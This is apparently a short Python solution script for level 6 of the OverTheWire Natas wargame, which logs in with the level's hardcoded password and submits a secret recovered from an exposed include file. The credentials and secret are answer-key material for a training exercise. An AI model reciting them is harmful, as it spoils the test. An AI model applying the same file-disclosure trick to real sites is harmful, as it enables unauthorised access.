import requests

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
response = session.post(
    url, data={"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}, auth=(username, password))
# source_code_url = "http://{}.natas.labs.overthewire.org/index-source.html".format(username)
# secret_url = "http://{}.natas.labs.overthewire.org/includes/secret.inc".format(username)
# response = session.get(source_code_url, auth=(username, password))
content = response.text

print(content)
